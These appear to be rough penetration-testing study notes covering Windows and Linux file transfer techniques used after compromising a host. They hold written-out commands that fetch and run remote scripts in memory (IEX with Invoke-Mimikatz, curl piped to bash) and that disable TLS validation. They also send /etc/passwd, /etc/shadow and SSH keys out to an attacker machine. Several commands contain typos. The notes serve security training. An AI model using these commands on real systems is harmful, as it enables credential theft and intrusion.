\\\\\\\\\\\=================================
File transfers
\\Setting the storage
-understand how file transfers and how network operate . host maybe prevent our actions, like app whitelisting or AV/EDR blocking specific app or activities.
file transfers are also affected by network devies such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.
-File transfer is a core feature of any OS, and many tools exist to achive this. hwer many these tools may be blocked or monitored by diligent adm, and worth reviewing a reange of techniques that may be possible in a given environment
\\Windows File Transfer methods
atk can use various file transfer methods to operate and avoid being caught. defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised.
-blog post as an ex of an advanced persistent threat (APT)https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/
-Astaroth attack generally followed these steps: phishing link -> led to an LNK file open -> 
Execution WMIC tools with the "/format" parameter, which allowed the download and execution of malicious JavaScript code. the JavaScript code, in turn, down load
payload  by abusing the Bitadmin tool https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool
-> all payloads were bsaed64-encoded and decoded using the Certutil tool resulting in a few DLL files.
the regsvr32 tool : https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32
the used to loead one of the decoded DLLs. which decrypted and loaded other files ultil the final payload, Astaroth, was injected into the UserInit process 
-EX of multiple methods for file transfer and the threat actor using those methods to bypass defensiv
\\Download operations
task: access to machine MS02 need to download a file from pawnbox machine. let see how to accomplish this using multiple file download methods
\\PowerShell Base64 Encode & decode
this is a methods that donot require network comm. by access terminal encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation. decoding the file in the original content. 
-essential step of this method is to ensure file encode and decode is correct. use MD5Sum:https://man7.org/linux/man-pages/man1/md5sum.1.html
a program that calculates and verifies 128-bit MD5 checksums. 
\\Pwnbox check SSH Key MD5 hash
$md5sum id_rsa
\\Pwn encode SSH Key to Base64
$cat id_rsa |base64 -w 0;echo
=> copy string into a window powershell and use soem ps function to decode

-confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.5&viewFallbackFrom=powershell-7.2
$Get-FileHash C:\Users\Public\rd_rsa -Algorithm md5sum
Noote: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
\\PowerShell Web downloads
-most companies allow http and HTTPS outbound traffic through the firewall to allow employee productivity leveraging these transportation methods for file transfer operation is very convinient.
still defenders can use web filtering solutions to prevent access to specific website categories, block the download of the file type (like .exe) or only allow access to a list of whitelisted domains in more restricted networks
-Power shell offer many file transfer options in any version of ps the System.Net.WebClient class can be used to download a file 
over http, https or FTP. the following table describes WebClient methods for downloading data from a resource:
Method	Description
OpenRead	Returns the data from a resource as a Stream.
OpenReadAsync	Returns the data from a resource without blocking the calling thread.
DownloadData	Downloads data from a resource and returns a Byte array.
DownloadDataAsync	Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile	Downloads data from a resource to a local file.
DownloadFileAsync	Downloads data from a resource to a local file without blocking the calling thread.
DownloadString	Downloads a String from a resource and returns a String.
DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.
\\Powershell DownloadFile Method
specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name
\\File Download
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
\\PowerShell DownloadString - Fileless Method
fileless attacks work by using some OS functions to download the payload and execute it directly. 
-PS also be used to perform fileless attacks. instead of downloading a PS script to disk. 
we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
IEX also accepts pipeline input
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
\\PowerShell Invoke-WebRequest
-from ps 3.0 onwards. the Invoke-WebRequest cmdlet is also available, but it is noticably slower at downloading files.
 you can use the aliases iwr, curl and wget instead of Invoke-WebRequest 
 $PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-Harmj0y has complied an extensive list of PS download cradles :https://gist.github.com/HarmJ0y/bb48307ffa663256e239
it worth gaining familiarity with them and their nuances, such as lack of proxy awareness or touching disk (downloading a file onyo the target) to select the appropriate one for the situation
\\Common Errors with PowerShell=========================================
there may be cases when the Internet Explorer first lauch config has not been completed, which prevents the download
-by pass by -UseBasicParsing
$Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
$Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing| IEX  
-another error in PowerShell download isrelated to the SSL/TLS secure channel if the certificate is not trusted we can by 
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
\\SMB Downloads
the SMB tcp 445 is common in enterprise networks where Windows services are running. it enables app and users to transfer files to and from remote servers
- we can use SMB to download files from our Pwnbox easily. we need to create an SMB server in our Pwnbox with 
https://github.com/fortra/impacket/blob/master/examples/smbserver.py
from impacket and then use copy, move PowerShell Copy-Item or any other tool that allows conn to SMB
\\Create the SMB Server
$sudo impacket-smbserver share -smb2support /tmp/smbshare
\\Copy a File from the SMB Server
$copy \\192.168.220.133\share\nc.exe
new version of Window block unauthenticated guest access, as we can see in the following command:
$copy \\192.168.220.133\share\nc.exe
To transfer files in this scenarios, we can set a username and password using our Impacket SMB server and mount the SMB server on our Windows target machine:
\\Create the SMB Server with a Username and Password
$sudo Impacket-smbserver share -smb2support /tmp/smbshare -user test-password test
\\Mount the SMB Server with Username and Password
$net use n: \\192.168.220.133\share /user:test test
Note: you can also mount SMB server if receive an error when use copy filename \\IP\sharename
\\FTP Downloads
Another way to transfer files is using FTP (file Transfer Protocol), which use port TCP/21 and TCP/20 
-use FTP client or PS Net.WebClient to download files from an FTP server.
-config an FTP Server in our atk host using Python3 pyftpdlib module
\\Installing the FTP Server Python3 Module - pyftpdlib
$sudo pip3 install pyftpdlib
then we can specify port 21 because bydefault, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we dont set a user and Pwndoc
\\Setting up a Python3 FTP Server
$sudo python3 -m pyftpdlib --port 21
-After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PS Net.WebClient
\\Transferring Files from an FTP Server Using PowerShell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
-When we get a shell on a remote machine, we may not have an interactive shell if that case we can crete a FTP cmd line file to download a file.
->create a file containing the cmd we want to execute and then use the FTP client to use that file to download that file
$> echo open 192.168.49.128 > ftpcommand.txt
$> echo USER anonymous >> ftpcommand.txt
$> echo binary >> ftpcommand.txt
$> echo GET file.txt >> ftpcommand.txt
$> echo bye >> ftpcommand.txt
$> ftp -v -n -s:ftpcommand.txt
$>open 192.168.49.128 >USER anonymous 
$> GET file.txt >bye > more file.txt
\\Upload operations
-There are also situation such as pwd cracking, analysis, exfiltration, etc,...where we must upload files from our target machine into our atk host. we can use the same methods we used for download operation but now for uploads.
Lets see how we can accomplish uploading files in various ways.
\\PowerShell Base64 Encode & decode
Encode File Using PowerShell
PS$  [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
$ PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
->copy this content and paste it into our atk host, use the base64 command to decode it, and use the md5sum app to confirm the transfer happened correctly

echo <string base64>= | base64 -d > hosts
$md5sum hosts
\\PowerShell Web uploads
PS doesn't have a buit-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function.,well also need a Web server that accepts uploads , which is not default option in most common webserver utilities
- use uploadserver, and extended module of the python HTTP.server module, which includes a file upload pages
\\Installing a configured WebServer with Upload
$pip3 install uploadserver
$python3 -m uploadserver
-> now use a PowerShell script PSUpload.ps1 which usese Invoke-RestMethod to perform the upload operations.
the scrip accept 2 parameters -File, which use to specify the file path, and -Uri, the server URL 
where upload our file
\\PowerShell Script to Upload a file to python Upload Server
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
\\PowerShell Base64 Web Upload
-other ways to use PS and base64 encoded files for upload operation is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. 
use Netcat to listen in on a port specify and send the file as POST request. -> copy the output and use the base64 decode function to convert the base 64 string into a file
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
\\\\\\==================================
LInux File transfer methods
few: cURL, wget, Python, all use HTTP to communicate
although  Linux can comm via FTP, SMB like Windows, most malware on all diff oS use HTTP and HTTPS for comm
\\Download operations
\\Base64Encoding / decoding
- an method that does not require network comm, by encode a file to a base 64 string > copy its content into the terminal then perform the reverse operation
Bash>$md5sum id_rsa 
- we can use cat to print the file content, and base64 encode the output using a pipe | 
use option -w 0 to create only one line and ended up with the command with a semi-colon(;) and echo to start new line and make it easier to copy
$cat id_rsa | base64 -w 0;echo
> coopy it to target linux $echo -n '<string base64>' | base64 -d > id_rsa
confirm it was tranferred successfully using the md5sum command

$md5sum id_rsa 
NOTE: we can upload file using the reverse operation.from compromised target cat and base64 encode a file and decode it in pawnbox
\\Web Downloads with Wget and cURL
2 most common utilities in Linux distro to interact with web app are wget and curl 
wget need to specify the URL and the option '-O' to set the output filename
\\Download a File Using wget
$wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
cURL is very similar to wget. but the output filename option is lowercase '-o'
$curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
\\Fileless Attack using Linux
because the way linux work and how pipes operation, most of the tools we use in Linux can be used to replicate fileless operation, which means that we dont have to download a file to execute it
NOTE: some payload such as mkfifo write files to disk, keep in mind that while the execution of the payload may be fileless when use a pipe, depending on the payload chosen it may create temp files on the OS
\\Fieless Download with cURL
$curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
similar we can download a python script file from a web svr and pipe it into the python inary /
\\Fileless download with wget 
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
this wwill execute 
\\Download with Bash (/dev/tcp)
in case non of well-known file transfer tools are available. as long as Bash version 2.04 or greater is installed (
    compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file download
\\Connect to the Target webserver
$exec 3<>/dev/tcp/10.10.10.32/80
\\HTTP GET request
$exec -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
\\Print the Response
$cat <&3
\\SSH Downloads
SSH comes with an SCP utility for remote file transfer by default uses the SSH Protocol
SCP (secure copy) is a command-line utility allow copy and directories betw 2 host securely. we can copy file from local to remote svr and from remote svr to our mochine
SCP is very similar to copy or cp but insted of provie a local path we need a specify a username the remote IP addr or DNS name , and the user's credentials
\\Enabling the SSH Server
$sudo systemctl enable SSH
\\Starting the SSH Server
$sudo systemctl start SSH
\\Checking for SSH listening port
$netstat -lnpt 
\\Bigin downloading File using SCP 
$scp plaintext@192.169.49.128:/root/myroot.txt .
scp username@remote_host:/path/file /path/destination
NOTE: we can create a temp user account for file transfer and avoid using your primary cred or keys on a remote computer
\\Upload operations
There also situation such as binary exploitation and packet capture analysis, where we must upload files from target machine onto or atk host.
the methods for downloads will also work for uploads 
\\Web upload
- upload server https://github.com/Densaugeo/uploadserver extended module of the Python HTTP.server module which includes a file upload page.
\\Pwnbox - start Web Server
$sudo python3 -m pip install --user upload server
\\pwn - Create a Self-Signed certificate
$openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
-The Websvr should not hos the cert, we recommend creating a new dir to host the file for our server
\\Pwnbox - Start web server
$mkdir https && cd https
$sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
\\Linux - Upload Multiple Files
$curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
option --insecure because we used a self-signed cert that we trusted
\\Alternative Web File Transfer Method
linux distro usually have python or php installed, starting a web server to transfer file is straightforward.
if the server compromised is a web svr, we can move the files we want to transfer to the web svr dir and access them from the web page which means that we are downloadng the file prom Pwnbox
- it is possible to stand up a web svr using various languages. A compromised Linux Machine may not have a web server installed. in such cases we can use a mini web svr. what they perhaps lack in security, they make up for flexibility as the webroot location and listening ports can quickly be changed
\\Linux-Creating a Web Server with Python3
$python3 -m http.server
\\Linux- Creating a Web Server with Python2.7
$python2.7 -m SimpleHTTPServer
\\linux-Creating a Web Server with php
$php -S 0.0.0.0:8000
\\Linux- Creating a Web Server with Ruby 
$ruby -run -ehttpd . -p8000
\\Download the File from the Target Machine onto the Pwnbox
$wget 192.168.49.128:8000/filetotransfer.txt
Note: when we start a new web server using Python or PHP, its important to consider that inbound traffic maybe blocked we are transferring a file from our target onto our atk host, but we are not uploading the file
\\SCP Upload
some company allow the SSH protocol (TCP/22) for outbound conn, and if that's the case, we can use an SSH svr with the scp utility to upload files,
attemp to upload files to target machine using the SSH protocol 
\\File Upload using SCP
$scp /etc/passwd htp-student@10.129.86.90:/home/htb-student/
NOTE: scp syntax is similar to cp or copy
